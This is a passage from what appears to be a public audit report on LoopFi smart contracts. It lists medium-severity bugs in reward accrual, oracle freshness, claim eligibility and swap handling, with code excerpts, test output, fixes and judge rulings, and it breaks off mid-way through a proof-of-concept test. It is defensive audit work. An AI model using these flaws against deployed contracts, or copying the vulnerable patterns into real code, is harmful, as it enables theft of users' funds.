  Alice's balance at day 30| 12499999999999999999998

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.43ms (1.46ms CPU time)

Ran 1 test suite in 320.56ms (6.43ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Explanation:**

1. (Line 37) As mentioned, we introduce the first incentive (`10000 ether`) at day 0.
2. (Line 43) At day 15, Alice withdraws her tokens, receiving part `A` as seen in the symbol diagram. (`4999999999999999999999` `~=` `5000 ether`)
3. (Line 48) 2nd Incentive (`10000 ether`) is introduced at day 15, causing remaining rewards leftover from the first incentive to be incorrectly stretched until the end of the 2nd incentive's `rewardDuration`.
4. (Line 52) At day 30, Alice withdraws her tokens, now her total balance is `12499999999999999999998` `~=` `12500 ether`.

Let's examine Alice's balance at the end of 30 days: `12500 ether` = `5000 ether` + `2500 ether` + `5000 ether` = `A` + `B/2` + `C/2`.

However, the rightful amount of rewards her balance should be at day 30 is: `A` + `B` + `C/2` = `15000 ether`. The remaining `15000 ether` - `12500 ether = 2500 ether` that Alice is entitled to claim at day 30, will only be given throughout days 30 to 45.

This is very unfair to Alice who has staked her tokens since the beginning of the first incentive, and now she has to wait longer for the rewards from the first incentive which is a high opportunity cost incurred for her.

This is made worse if the incentive given at the 2nd wave is significantly smaller than the original amount in wave 1, because it means she will have to wait longer for her significant rewards from the 1st wave; all because of the 2nd wave of small and insignificant incentive.

### 2nd way of exploit

Referencing the same scenario in the Proof of Code section. A malicious staker can choose to stake anytime between day 30 to day 45 and because of that, Alice can **permanently lose** some of her rewards.

**Example:**

- Malicious staker sees the scenario in the above section happening, and decides to call `stake` on day 30.
- When the malicious staker withdraws on day 45, he is able to receive a portion of reward part `B`, even though he is **not** supposed to; we already established in the symbol diagram that part `B` is supposed to end on day 30. Since the malicious staker only staked on day 30, he **should not** be getting the rewards as he **locked** his tokens late. Alice **permanently** loses a portion of reward part `B` to the malicious staker who is not supposed to receive it.

**Overall Disclaimer:** The example above of the 2nd incentive being introduced at exactly halfway (15 days) of the 1st incentive's duration was just used as an example. This bug still exists as long as the 2nd incentive is introduced at any point of time throughout the 1st incentive's duration, causing the respective portion to be spread across the wrong period.

### Recommended Mitigation Steps

```diff
+ struct rewardQueue {
+   uint256 periodFinish;
+   uint256 rewardPerSecond;
+ }
// below is the struct from src/reward/interfaces/LockedBalance.sol
struct Reward {
- uint256 periodFinish;
- uint256 rewardPerSecond;
+ rewardQueue[] rewards;   
+ uint256 rewardCounter;
  uint256 lastUpdateTime;
  uint256 rewardPerTokenStored;
  uint256 balance;
}
```

We can use a queue-like list to store rewards and their respective `periodFinish`, as well as a counter that we can increment when `rewards[rewardCounter].periodFinish` `<` `block.timestamp`.

`rewards[i].rewardsPerSecond` is meant to be distributed between the timeframe of `rewards[i-1].periodFinish` to `rewards[i].periodFinish` **only**.

### Tools Used

Foundry, VSCode

### Assessed type

Math

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/133#event-14337776248)**

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/133#issuecomment-2391865119):**
 > @Koolex - `MultiFeeDistribution` is an exact fork of [Radiant's](https://github.com/radiant-capital/v2/blob/cd618877151896415705468f1b2a43c4b75b3c5b/contracts/radiant/staking/MultiFeeDistribution.sol); the scenario that the warden pointed out to is intended.

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/133#issuecomment-2440035867):**
 > While this is an exact fork of Radiant, it does not mean it wouldn't have issues. The following both statements could be right:
> - Sponsor has intention the same Radiant has on their contract, therefore, the issue above would be a QA. 
> - Sponsor has intention the same Radiant has on their contract, but couldn't know this issue exists (regardless if it was intended by Radiant), unless subjecting it to an audit which is what happened.
> 
> However, since the sponsor confirmed this, a Medium severity is appropriate.

***

## [[M-28] `BalancerOracle::update()` can return a stale price](https://github.com/code-423n4/2024-07-loopfi-findings/issues/124)
*Submitted by [4B](https://github.com/code-423n4/2024-07-loopfi-findings/issues/124), also found by [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/432) and [Evo](https://github.com/code-423n4/2024-07-loopfi-findings/issues/263)*

Whenever `block.timestamp - lastUpdate > updateWaitWindow` and needs to update the price, it will return a stale price because it will fetch the price from the `lastUpdate` not the `currentUpdate`.

### Proof of Concept

In the `update()` function these are the lines we'll find:

```
     //@audit let's say price is out of date and its getting updated won't it get the price from one hour ago?
    //problem is it uses a current timestamp but with an hour old price
            if (block.timestamp - lastUpdate < updateWaitWindow) revert BalancerOracle__update_InUpdateWaitWindow();
            // update the safe price first
            safePrice = safePrice_ = currentPrice;
            lastUpdate = block.timestamp;

            uint256[] memory weights = IWeightedPool(pool).getNormalizedWeights();
            uint256 totalSupply = IWeightedPool(pool).totalSupply();

            uint256 totalPi = WAD;
            uint256[] memory prices = new uint256[](weights.length);
            // update balances in 18 decimals
            for (uint256 i = 0; i < weights.length; i++) {
                // reverts if the price is invalid or stale
                prices[i] = _getTokenPrice(i);
                uint256 val = wdiv(prices[i], weights[i]);
                uint256 indivPi = uint256(wpow(int256(val), int256(weights[i])));

                totalPi = wmul(totalPi, indivPi);
            }

            currentPrice = wdiv(wmul(totalPi, IWeightedPool(pool).getInvariant()), totalSupply);
```

From the code, we can see that the `currentPrice` is the last thing updated.

Whenever the `updateWindow` reaches or passes for us to fetch a new price, the `safePrice` is updated first, which is the value from the `lastUpdate` which is "stale".

It can be argued that its a design decision meaning the `updateWindow` is just time it needs to fetch a new price, but it doesn't mean the price is old. However, the `updateWindow` can be passed and not updated right after meaning the price is two times back because it wasn't updated right away.

### Recommended Mitigation Steps

Revisit the logic to be able to fetch fresh price whenever there need to be a new price fetched.

### Assessed type

Oracle

**[0xtj24 (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/124#issuecomment-2340656472):**
 > That logic updates the price only after a certain `updateWaitWindow` has passed, storing the oldest safe price. If not updated with the keeper it will return stale price depending on the `stalePeriod`. This is an expected behaviour.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/124#issuecomment-2408978766):**
 > Since `updateWaitWindow` is immutable, it can't be changed. Therefore, keeping the severity to Medium.

***

## [[M-29] Bug in `claim` allows users who are disqualified to claim their previously earned emissions](https://github.com/code-423n4/2024-07-loopfi-findings/issues/123)
*Submitted by [rscodes](https://github.com/code-423n4/2024-07-loopfi-findings/issues/123), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/575)*

In `ChefIncentivesController.sol`:

```solidity
function claim(address _user, address[] memory _tokens) public whenNotPaused {
  if (eligibilityMode != EligibilityModes.DISABLED) {
->    if (!eligibleDataProvider.isEligibleForRewards(_user)) revert EligibleRequired();
->    checkAndProcessEligibility(_user, true, true);
  }
  ........
}
```

The function calls `isEligibleForRewards` without calling `refresh`; hence, things like disqualification resulting from a change in price will not be accounted for. This transaction will go through without reverting, allowing the user to `claim` even though his total value locked is now below 5% of his debt due to the price change of the token.

The `checkAndProcessEligibility(_user, true, true);` function, however, does include `refresh`, which will update the user's status. Hence, that line should be called first, so that the transaction will revert in the `if statement`, to prevent malicious lockers from calling this function even when they are not eligible.

### Recommended Mitigation Steps

```diff
function claim(address _user, address[] memory _tokens) public whenNotPaused {
  if (eligibilityMode != EligibilityModes.DISABLED) {
-     if (!eligibleDataProvider.isEligibleForRewards(_user)) revert EligibleRequired();
-     checkAndProcessEligibility(_user, true, true);
      
      // swap the order !!

+     checkAndProcessEligibility(_user, true, true);
+     if (!eligibleDataProvider.isEligibleForRewards(_user)) revert EligibleRequired();
  }

  _updateEmissions();

  uint256 currentTimestamp = block.timestamp;

  uint256 pending = userBaseClaimable[_user];
  userBaseClaimable[_user] = 0;
  uint256 _totalAllocPoint = totalAllocPoint;
  uint256 length = _tokens.length;
  for (uint256 i; i < length; ) {
      if (!validRTokens[_tokens[i]]) revert InvalidRToken();
      VaultInfo storage pool = vaultInfo[_tokens[i]];
      if (pool.lastRewardTime == 0) revert UnknownPool();
      _updatePool(pool, _totalAllocPoint);
      UserInfo storage user = userInfo[_tokens[i]][_user];
      uint256 rewardDebt = (user.amount * pool.accRewardPerShare) / ACC_REWARD_PRECISION;
      pending = pending + rewardDebt - user.rewardDebt;
      user.rewardDebt = rewardDebt;
      user.lastClaimTime = currentTimestamp;
      unchecked {
          i++;
      }
  }

  _vestTokens(_user, pending);

  eligibleDataProvider.updatePrice();
}
```

### Assessed type

Invalid Validation

**[amarcu (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/123#issuecomment-2363389333):**
 > Other users can claim if a user becomes ineligible, if no one claims the user can, but the check can be added. Would consider this a Medium.

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/123#issuecomment-2371225707):**
 > @amarcu - per my understanding, the issue is, users are claiming based on outdated eligibility check since`checkAndProcessEligibility` is called after.

***

## [[M-30] Usage of `lastEligibleStatus` can cause user to miss out on rewards on `manualStopEmissionsFor` invocation](https://github.com/code-423n4/2024-07-loopfi-findings/issues/121)
*Submitted by [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/121), also found by [lanrebayode77](https://github.com/code-423n4/2024-07-loopfi-findings/issues/433) and [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/27)*

Invoking `manualStopEmissionsFor` can cause the user to miss out on rewards from vaults even after the user becomes eligible.

### Proof of Concept

If `lastEligibleStatus` and `isCurrentlyEligible` returns true, only the balance of the specific vault is updated. The idea is that whenever both these are true, all the other balances would have already been updated to the current value and hence need not be re-queried again.

```solidity
    function handleActionAfter(address _user, uint256 _balance, uint256 _totalSupply) external {
        if (!validRTokens[msg.sender] && msg.sender != address(mfd)) revert NotRTokenOrMfd();


        if (_user == address(mfd) || eligibilityExempt[_user]) {
            return;
        }
        if (eligibilityMode == EligibilityModes.FULL) {
            bool lastEligibleStatus = eligibleDataProvider.lastEligibleStatus(_user);
            bool isCurrentlyEligible = eligibleDataProvider.refresh(_user);
            if (isCurrentlyEligible) {
                if (lastEligibleStatus) {
                    _handleActionAfterForToken(msg.sender, _user, _balance, _totalSupply);
                } else {
                    _updateRegisteredBalance(_user);
                }
            } else {
```

But this assumption is broken when `manualStopEmissionsFor` is called which will set the balance corresponding to each vault as 0:

```solidity
    function manualStopEmissionsFor(address _user, address[] memory _tokens) public isWhitelisted {
        if (_user == address(0)) revert AddressZero();
        uint256 length = _tokens.length;
        for (uint256 i; i < length; ) {
            address token = _tokens[i];
            
            ....

                uint256 newTotalSupply = pool.totalSupply - amount;
                user.amount = 0;
                user.rewardDebt = 0;
                pool.totalSupply = newTotalSupply;


                emit BalanceUpdated(token, _user, 0, newTotalSupply);
            }
```

In this case, if an user's vault position update makes the user eligible for rewards, only that specific vault associated debt will be earning rewards and all the other vault balances won't be updated.

### Recommended Mitigation Steps

The `lastEligibleStatus` check can be removed or it can be handled alongside the `manualStopEmissionsFor` implementation.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/121#event-14337850021)**

***

## [[M-31] Discrepancy between the `lastRewadTime` and the `lastAllPoolUpdate` can allow for incorrect reward distribution to pools if `registerRewardDeposit` deposits less assets](https://github.com/code-423n4/2024-07-loopfi-findings/issues/108)
*Submitted by [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/108), also found by [Rhaydden](https://github.com/code-423n4/2024-07-loopfi-findings/issues/562), [seaona](https://github.com/code-423n4/2024-07-loopfi-findings/issues/423), [lanrebayode77](https://github.com/code-423n4/2024-07-loopfi-findings/issues/246), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/169), and [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/14)*

Incorrect reward distribution causing some pools to gain more while others to gain less.

### Proof of Concept

The `_massUpdatePools` function always sets `lastAllPoolUpdate = block.timestamp`:

```solidity
    function _massUpdatePools() internal {
        uint256 totalAP = totalAllocPoint;
        uint256 length = poolLength();
        for (uint256 i; i < length; ) {
            _updatePool(vaultInfo[registeredTokens[i]], totalAP);
            unchecked {
                i++;
            }
        }
        lastAllPoolUpdate = block.timestamp;
    }
```

But the `individualPool` update timestamp can become lower than `block.timestamp` if it surpasses the `endRewardTime`; i.e., the time in which the entire assets deposited is supposed to be depleted.

```solidity
    function _updatePool(VaultInfo storage pool, uint256 _totalAllocPoint) internal {
        uint256 timestamp = block.timestamp;
        uint256 endReward = endRewardTime();
        if (endReward <= timestamp) {
            timestamp = endReward;
        }
        if (timestamp <= pool.lastRewardTime) {
            return;
        }


        (uint256 reward, uint256 newAccRewardPerShare) = _newRewards(pool, _totalAllocPoint);
        accountedRewards = accountedRewards + reward;
        pool.accRewardPerShare = pool.accRewardPerShare + newAccRewardPerShare;
        pool.lastRewardTime = timestamp;
```

Furthermore, the `endRewardTime` is calculated as `newEndTime = (unclaimedRewards + extra) / rewardsPerSecond + lastAllPoolUpdate` whenever the `rewardsPerSecond` is non-zero:

```solidity
    function endRewardTime() public returns (uint256) {
        
        .....

        if (rewardsPerSecond == 0) {
            endingTime.estimatedTime = type(uint256).max;
            return type(uint256).max;
        } else {
            uint256 newEndTime = (unclaimedRewards + extra) / rewardsPerSecond + lastAllPoolUpdate;
            endingTime.estimatedTime = newEndTime;
            return newEndTime;
        }
```

If a `_massUpdatePools` call occurs when `block.timestamp` is greater than the `endRewardTime`, it will set the `lastRewardTime` of pools to be less than `lastAllPoolUpdate`; following which even if there are no more rewards, the new `endRewardTime` would be the timestamp of `lastAllPoolUpdate`. This will allow a pool to claim rewards worth `(lastAllPoolUpdate - initialEndTime) * rewardPerSecond` which is not an expected behaviour and not handled with the `endRewardTime` constant.

The above scenario can occur if the `registerRewardDeposit` function is invoked with a low amount of deposits (i.e., the deposited amount shouldn't cause the new end time to be `>= block.timestamp`) when the `endRewardTime` has been surpassed.

**Example:**

- pool A and B, 1:1 `rewardRatio`
- `rewardsPerSecond` = 1
- `endRewardTime` = 100
- `block.timestamp` = 110

`registerRewardDeposit` is invoked such that the new `endRewardTime` (i.e., even after including the newly deposited assets) is 105.

Now, the first `massUpdatePools` call will result in:
- `lastRewardTime` = 105 (`endRewardTime`)
- `lastAllPoolUpdate` = 110

The entire rewards of the contract are used up, but when `massUpdatePools` gets invoked again (e.g., via `claim` -> `_updateEmissions` -> `_massUpdatePools`), the new `endTime` will be 110 (i.e., `lastPoolUpdate + 0`).

`claim` is called for pool A in the same block, and A's `lastRewardTime` gets updated to 110 while B's remain 105. At 120 `registerRewardDeposit` is invoked with a lot of assets and B will accrue a reward of `(120 - 105)/2` while A will only accrue `(120 - 110)/2`.

### Recommended Mitigation Steps

In case `endTime > block.timestamp`, can set the `lastPoolUpdate` to `endTime` or always ensure that the `registerRewardDeposit` function will only be called with amounts such that the above issue doesn't occur.

### Assessed type

Context

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/108#event-14337851961)**

***

## [[M-32] Emission schedule is not followed and can cause unexpected allocation of rewards](https://github.com/code-423n4/2024-07-loopfi-findings/issues/104)
*Submitted by [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/104)*

Whenever a new emission schedule is to be followed, i.e., `block.timestamp `becomes greater than the `startOffset` of the schedule, the `setScheduledRewardsPerSecond` function invokes the `_massUpdatePools` function in order to bring the pools to the latest state.

```solidity
    function setScheduledRewardsPerSecond() internal {
        if (!persistRewardsPerSecond) {
            uint256 length = emissionSchedule.length;
            uint256 i = emissionScheduleIndex;
            uint128 offset = uint128(block.timestamp - startTime);
            for (; i < length && offset >= emissionSchedule[i].startTimeOffset; ) {
                unchecked {
                    i++;
                }
            }
            if (i > emissionScheduleIndex) {
                emissionScheduleIndex = i;
=>              _massUpdatePools();
                rewardsPerSecond = uint256(emissionSchedule[i - 1].rewardsPerSecond);
            }
        }
```

Inside the `_massUpdatePools`, the previous `rewardsPerSecond` is used until `block.timestamp` instead of the `startOffset` of the new schedule; i.e., the correct update of `oldRewardsPerSecond * (newScheduleStartTimestamp - lastUpdateStamp) + newRewardsPerSecond * (block.timestamp - newScheduleStartTimestamp)` is not used.

`_massUpdatePools -> _updatePool -> _newRewards`

```solidity
    function _newRewards(
        VaultInfo memory pool,
        uint256 _totalAllocPoint
    ) internal view returns (uint256 newReward, uint256 newAccRewardPerShare) {
        uint256 lpSupply = pool.totalSupply;
        if (lpSupply > 0) {
            uint256 duration = block.timestamp - pool.lastRewardTime;
            uint256 rawReward = duration * rewardsPerSecond;
```

### Recommended Mitigation Steps

Correct the formula to similar like: `oldRewardsPerSecond * (newScheduleStartTimestamp - lastUpdateStamp) + newRewardsPerSecond * (block.timestamp - newScheduleStartTimestamp)`.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/104#event-14337858715)**

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/104#issuecomment-2393091946):**
 > @Koolex - this `ChefIncentivesController` code is basically the same as [RadiantV2](https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/ChefIncentivesController.sol).
> 
> I think all public Radiant issues should be out-of-scope, and that sponsors are aware of. Specifically, [this report](https://blocksec.com/blog/security-testing-report-for-radiant-v2) from Blocksec: "3.2.4 Potential Issue 5: Skippable Emission schedules" talks about basically the same thing as this issue, which is that emissions schedules may be not followed (and even skipped).
> 
> It is understandable for Radiant to not fix this since this is a edge case considering that emission schedule is updated frequently and the impacted amount of tokens are very small.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/104#issuecomment-2440205546):**
 > This issue is different than the one reported by Blocksec. Here, it is about the math, theirs is about skipping a schedule if the function is not invoked.
> 
> However, even if it is the same, as per my knowledge, there is no rule in C4 that says public issues somewhere else are out of scope, also not mentioned by the sponsor. 
> 
> Given above, this issue stays as-is.

***

## [[M-33] `PositionAction.sol#onCreditFlashLoan` may have leftover tokens after conducting `leverParams.auxSwap`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/87)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/87), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/86), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/428), [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/182), [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/161), and hash ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/117), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/115))*

First, let's inspect how deposit `decreaseLever` with swap enabled works:

1. Borrow loans from flashLender.
2. Repays CDPVault debt with the borrowed loans.
3. Withdraws collateral from CDPVault.
4. Conducts a `leverParams.primarySwap` and swap collateral to debt token.

Now, step 4 is an `EXACT_OUT` swap, since it is forced to swap the exact amount of debt tokens used to repay the flashloan. However, after step 4, there may be some collateral tokens left, which is the `residualAmount`.

If `leverParams.auxSwap` is not enabled, the collateral token is simply sent back to the recipient. However, if `leverParams.auxSwap` is enabled, a swap is performed.

The issue here is, the `leverParams.auxSwap` swap is an `EXACT_IN` swap, and user would hardcode the amount of `inTokens` used for this swap. There is no way to know the exact amount of collateral tokens left after step 4, so there must still be some collateral tokens leftover after the `leverParams.auxSwap`.

These leftover tokens are not sent to anybody, and stuck in the contract.

```solidity
    function decreaseLever(
        LeverParams calldata leverParams,
        uint256 subCollateral,
        address residualRecipient
    ) external onlyDelegatecall {
        // validate the primary swap
        if (leverParams.primarySwap.swapType != SwapType.EXACT_OUT || leverParams.primarySwap.recipient != self)
            revert PositionAction__decreaseLever_invalidPrimarySwap();

        // validate aux swap if it exists
>       if (leverParams.auxSwap.assetIn != address(0) && (leverParams.auxSwap.swapType != SwapType.EXACT_IN))
            revert PositionAction__decreaseLever_invalidAuxSwap();
        ...
    }

    function onCreditFlashLoan(
        address /*initiator*/,
        uint256 /*amount*/,
        uint256 /*fee*/,
        bytes calldata data
    ) external returns (bytes32) {
        if (msg.sender != address(flashlender)) revert PositionAction__onCreditFlashLoan__invalidSender();
        (
            LeverParams memory leverParams,
            uint256 subCollateral,
            address residualRecipient
        ) = abi.decode(data,(LeverParams, uint256, address));

        uint256 subDebt = leverParams.primarySwap.amount;

        underlyingToken.forceApprove(address(leverParams.vault), subDebt);
        // sub collateral and debt
        ICDPVault(leverParams.vault).modifyCollateralAndDebt(
            leverParams.position,
            address(this),
            address(this),
            0,
            -toInt256(subDebt)
        );

        // withdraw collateral and handle any CDP specific actions
        uint256 withdrawnCollateral = _onDecreaseLever(leverParams, subCollateral);

        bytes memory swapData = _delegateCall(
            address(swapAction),
            abi.encodeWithSelector(
                swapAction.swap.selector,
                leverParams.primarySwap
            )
        );
        uint256 swapAmountIn = abi.decode(swapData, (uint256));

        // swap collateral to stablecoin and calculate the amount leftover
        uint256 residualAmount = withdrawnCollateral - swapAmountIn;

        // send left over collateral that was not needed to payback the flash loan to `residualRecipient`
        if (residualAmount > 0) {

            // perform swap from collateral to arbitrary token if necessary
>           if (leverParams.auxSwap.assetIn != address(0)) {
                _delegateCall(
                    address(swapAction),
                    abi.encodeWithSelector(
                        swapAction.swap.selector,
                        leverParams.auxSwap
                    )
                );
            } else {
                // otherwise just send the collateral to `residualRecipient`
                IERC20(leverParams.primarySwap.assetIn).safeTransfer(residualRecipient, residualAmount);
            }
        }

        underlyingToken.forceApprove(address(flashlender), subDebt);

        return CALLBACK_SUCCESS_CREDIT;
    }
```

### Recommended Mitigation Steps

Send the amount of `IERC20(leverParams.primarySwap.assetIn).balance(address(this))` to `residualRecipient` to make sure there are no leftovers.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/87#event-14319329673)**

***

## [[M-34] `PositionAction.sol#_deposit` incorrectly checks `auxSwap.assetIn` should be equal to `collateralParams.targetToken`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85)*

`PositionAction.sol#_deposit` incorrectly checks `auxSwap.assetIn` should be equal to `collateralParams.targetToken`. This is incorrect, because `auxSwap.assetIn` should be the token used to swap for `collateralParams.targetToken`.

### Bug Description

First, let's inspect how deposit works with swap enabled:

1. `collateralParams.collateralizer` transfers `auxSwap.assetIn` token to Proxy.
2. Proxy performs a swap (Balancer or Uniswap) to get collateral token.
3. Deposit collateral tokens.

The issue here is, during step 2, the swap is to exchange `auxSwap.assetIn` for `collateralParams.targetToken`. This means that the two tokens must not be equal. However, the current implementation checks that they are the same. This means the swap feature is completely unusable.

```solidity
    function _deposit(
        address vault,
        address position,
        CollateralParams calldata collateralParams,
        PermitParams calldata permitParams
    ) internal returns (uint256) {
        uint256 amount = collateralParams.amount;

        if (collateralParams.auxSwap.assetIn != address(0)) {
            if (
>               collateralParams.auxSwap.assetIn != collateralParams.targetToken ||
                collateralParams.auxSwap.recipient != address(this)
            ) revert PositionAction__deposit_InvalidAuxSwap();
            amount = _transferAndSwap(collateralParams.collateralizer, collateralParams.auxSwap, permitParams);
        } else if (collateralParams.collateralizer != address(this)) {
            _transferFrom(
                collateralParams.targetToken,
                collateralParams.collateralizer,
                address(this),
                amount,
                permitParams
            );
        }

        return _onDeposit(vault, position, collateralParams.targetToken, amount);
    }
```

### Recommended Mitigation Steps

Remove the check.

###]# Assessed type

Invalid Validation

**[amarcu (LoopFi) disputed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2367730073):**
 > The flow is correct, for example this is a test function where we go from USDC to the collateral token.
 >
> ```
> function test_deposit_vault_with_entry_swap_from_USDC() public {
>         uint256 depositAmount = 10_000 * 1e6;
>         uint256 amountOutMin = (depositAmount * 1e12 * 98) / 100; // convert 6 decimals to 18 and add 1% slippage
> 
>         deal(address(USDC), user, depositAmount);
> 
>         // build increase collateral params
>         bytes32[] memory poolIds = new bytes32[](1);
>         poolIds[0] = stablePoolId;
> 
>         address[] memory assets = new address[](2);
>         assets[0] = address(USDC);
>         assets[1] = address(token);
> 
>         CollateralParams memory collateralParams = CollateralParams({
>             targetToken: address(USDC),
>             amount: 0, // not used for swaps
>             collateralizer: address(user),
>             auxSwap: SwapParams({
>                 swapProtocol: SwapProtocol.BALANCER,
>                 swapType: SwapType.EXACT_IN,
>                 assetIn: address(USDC),
>                 amount: depositAmount, // amount to swap in
>                 limit: amountOutMin, // min amount of collateral token to receive
>                 recipient: address(userProxy),
>                 deadline: block.timestamp + 100,
>                 args: abi.encode(poolIds, assets)
>             })
>         });
> 
>         uint256 expectedCollateral = _simulateBalancerSwap(collateralParams.auxSwap);
> 
>         vm.prank(user);
>         USDC.approve(address(userProxy), depositAmount);
> 
>         vm.prank(user);
>         userProxy.execute(
>             address(positionAction),
>             abi.encodeWithSelector(
>                 positionAction.deposit.selector,
>                 address(userProxy),
>                 address(vault),
>                 collateralParams,
>                 emptyPermitParams
>             )
>         );
> 
>         (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
> 
>         assertEq(collateral, expectedCollateral);
>         assertEq(debt, 0);
>     }
> 
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2375053352):**
 > Requesting a PoC from the warden, only in PJQA please. Will re-evaluate then.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2392801259):**
 > @amarcu @Koolex - First, let's see how `CollateralParams` is defined. From `// optional swap from targetToken to collateral, or collateral to targetToken` we can see that if there is a swap existent, the `targetToken` can be either the `inputToken` or the `outputToken`. The issue is that the buggy check forces `targetToken` to be `inputToken`, and does not allow for it being the output token.
> 
> ```solidity
> struct CollateralParams {
>     // token passed in or received by the caller
>     address targetToken;
>     // amount of collateral to add in CDPVault.tokenScale() or to remove in WAD
>     uint256 amount;
>     // address that will transfer the collateral or receive the collateral
>     address collateralizer;
>     // optional swap from `targetToken` to collateral, or collateral to `targetToken`
>     SwapParams auxSwap;
> }
> ```
> 
> ```solidity
>         if (collateralParams.auxSwap.assetIn != address(0)) {
>             if (
> >               collateralParams.auxSwap.assetIn != collateralParams.targetToken ||
>                 collateralParams.auxSwap.recipient != address(this)
>             ) revert PositionAction__deposit_InvalidAuxSwap();
>             amount = _transferAndSwap(collateralParams.collateralizer, collateralParams.auxSwap, permitParams);
>         } ...
>         return _onDeposit(vault, position, collateralParams.targetToken, amount);
> ```
> 
> We can also see that at the end of the function, a `_onDeposit(vault, position, collateralParams.targetToken, amount);` is called to deposit the token to vault, which passes on the `collateralParams.targetToken` for depositing in vault.
> 
> The most common use case is to swap random input `tokenA` to `targetToken`, and deposit `targetToken` into vault. For this case, if we force `targetToken` to be `inputToken`, the swap doesn't make sense.
> 
> Now, responding to the passing unit test. The unit test dataflow is, user sets USDC as `inputToken`, and `targetToken` also as USDC. However, the vault receives a different `token` than USDC. But why did the unit test pass? 
>
> Because for the PositionAction20.sol, the `onDeposit()` function doesn't about care the passed in token; thus, it doesn't matter whichever token we set as `targetToken`. But for PositionAction4626.sol, the `targetToken` is used to check if it is the collateral for vault, and if not, it will perform a ERC4626 deposit first, and in this case, if the `targetToken` is incorrect, the deposit would fail.
> 
> ```solidity
>         vault = createCDPVault(
>             token, // token
>             5_000_000 ether, // debt ceiling
>             0, // debt floor
>             1.25 ether, // liquidation ratio
>             1.0 ether, // liquidation penalty
>             1.05 ether // liquidation discount
>         );
> ```
> 
> PositionAction20.sol:
>
> ```solidity
>     function _onDeposit(address vault, address position, address /*src*/, uint256 amount) internal override returns (uint256) {
>         address collateralToken = address(ICDPVault(vault).token());
>         IERC20(collateralToken).forceApprove(vault, amount);
>         return ICDPVault(vault).deposit(position, amount);
>     }
> ```
> 
> ```solidity
>     function _onDeposit(address vault, address /*position*/, address src, uint256 amount) internal override returns (uint256) {
>         address collateral = address(ICDPVault(vault).token());
> 
>         // if the src is not the collateralToken, we need to deposit the underlying into the ERC4626 vault
> @>      if (src != collateral) {
>             address underlying = IERC4626(collateral).asset();
>             IERC20(underlying).forceApprove(collateral, amount);
>             amount = IERC4626(collateral).deposit(amount, address(this));
>         }
> 
>         IERC20(collateral).forceApprove(vault, amount);
>         return ICDPVault(vault).deposit(address(this), amount);
>     }
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2408959180):**
 > @pkqs90  PoC (coded) is requested. Please provide it ASAP.
> 
> Also the impact is not clear. I am assuming the report implies that the functionality doesn't work as intended. But elaboration on this is required. 
> 
> > `PositionAction.sol#_deposit` incorrectly checks `auxSwap.assetIn` should be equal to `collateralParams.targetToken`. This is incorrect, because `auxSwap.assetIn` should be the token used to swap for `collateralParams.targetToken.`.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2409004758):**
 > @Koolex - I created a PoC based on the UT the sponsors provided. There are only 2 changes (which I also commented out in code):
> 1. Use `PositionAction4626` instead of `PositionAction20`.
> 2. Change `targetToken` to `token`, since the vault's collateral token is `token`. (The previous UT `test_deposit_vault_with_entry_swap_from_USDC` marked this as `USDC`, which is incorrect).
> 
> Put this code inside PositionAction20.t.sol, and you will find this code reverts with error `PositionAction__deposit_InvalidAuxSwap`. However, this should not revert, because the input it provides is correct.
> 
> The use case is: User initially has USDC, user wishes to perform swap from USDC to `token` and deposit `token` in vault.
> 
> ```solidity
>     function test_PoC() public {
>         // Change 1: Use PositionAction4626 instead of PositionAction20.
>         PositionAction4626 positionAction4626 = new PositionAction4626(
>             address(flashlender),
>             address(swapAction),
>             address(poolAction),
>             address(vaultRegistry)
>         );
> 
>         uint256 depositAmount = 10_000 * 1e6;
